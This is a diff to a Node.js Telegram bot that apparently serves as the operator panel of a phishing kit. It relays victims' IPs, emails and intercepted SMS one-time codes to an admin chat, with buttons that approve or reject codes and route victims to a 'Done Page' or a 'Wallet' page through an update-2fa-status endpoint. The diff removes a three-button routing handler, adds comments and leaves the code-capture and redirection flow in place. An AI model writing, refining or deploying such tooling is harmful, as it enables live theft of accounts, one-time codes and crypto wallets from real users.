@@ -163,23 +163,6 @@ async function sendVerifyTelegram(ip, message) {
 }
 
 // -----------------
-// ✅ NEW: 2FA page with 3 buttons (Reject / Done / Wallet)
-// -----------------
-async function send2FATelegram(message, requestId) {
-  const options = {
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "❌ Reject", callback_data: `2fa_reject|${requestId}` }],
-        [{ text: "🏁 Done Page", callback_data: `2fa_done|${requestId}` }],
-        [{ text: "👛 Wallet", callback_data: `2fa_wallet|${requestId}` }]
-      ]
-    }
-  };
-  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
-}
-
-// -----------------
 // 2FA Code sender (keyboard-based Accept/Reject)
 // -----------------
 function send2FACode(code, chatId) {
@@ -222,7 +205,7 @@ bot.on("callback_query", async (query) => {
     const [action, identifier] = query.data.split("|");
     let status;
 
-    // --- Handle old-style 2FA approve/reject ---
+    // --- Handle 2FA approve/reject ---
     if (action === "2fa_approve" || action === "2fa_reject") {
       const twoFaStatus = action === "2fa_approve" ? "approved" : "rejected";
       const twoFaEmoji = twoFaStatus === "approved" ? "✅" : "❌";
@@ -233,6 +216,7 @@ bot.on("callback_query", async (query) => {
         body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
       });
 
+      // Step 1: Remove buttons, keep info message visible
       try {
         await bot.editMessageReplyMarkup(
           { inline_keyboard: [] },
@@ -243,6 +227,7 @@ bot.on("callback_query", async (query) => {
         );
       } catch (_) {}
 
+      // Step 2: Send status below
       const msgText = query.message.text || "";
       const smsMatch = msgText.match(/SMS[:\s]+([\d\s\-]+)/i);
       const displayCode = smsMatch ? smsMatch[1].trim() : null;
@@ -258,34 +243,6 @@ bot.on("callback_query", async (query) => {
       );
 
       await bot.answerCallbackQuery(query.id, { text: `❗️${twoFaStatus.toUpperCase()}❗️` });
-      return;
-    }
-
-    // --- ✅ NEW: Handle 2FA page 3-button actions ---
-    if (action === "2fa_done" || action === "2fa_wallet") {
-      const newStatus = action === "2fa_done" ? "approved1" : "approved2";
-      const replyText = action === "2fa_done"
-        ? `🏁 <code>${identifier}</code> has been directed to <b>Done Page</b>`
-        : `👛 <code>${identifier}</code> has been directed to <b>Wallet</b>`;
-
-      await fetch(`${APP_URL}/api/update-2fa-status`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ requestId: identifier, status: newStatus })
-      });
-
-      try {
-        await bot.editMessageReplyMarkup(
-          { inline_keyboard: [] },
-          {
-            chat_id: query.message.chat.id,
-            message_id: query.message.message_id
-          }
-        );
-      } catch (_) {}
-
-      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
       return;
     }
 
@@ -306,6 +263,7 @@ bot.on("callback_query", async (query) => {
       body: JSON.stringify({ email: identifier, identifier, status })
     });
 
+    // Step 1: Remove buttons but KEEP the original info message visible
     try {
       await bot.editMessageReplyMarkup(
         { inline_keyboard: [] },
@@ -316,6 +274,7 @@ bot.on("callback_query", async (query) => {
       );
     } catch (_) {}
 
+    // Step 2: Send status below the original message
     let replyText;
     if (status === "accepted1" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
       replyText = `📍 <code>${identifier}</code> has been directed to <b>🏁 Done Page 🏁</b>`;
@@ -363,6 +322,5 @@ module.exports = {
   sendApprovalRequestPage,
   sendLoginTelegram,
   sendVerifyTelegram,
-  send2FATelegram,
   send2FACode
 };
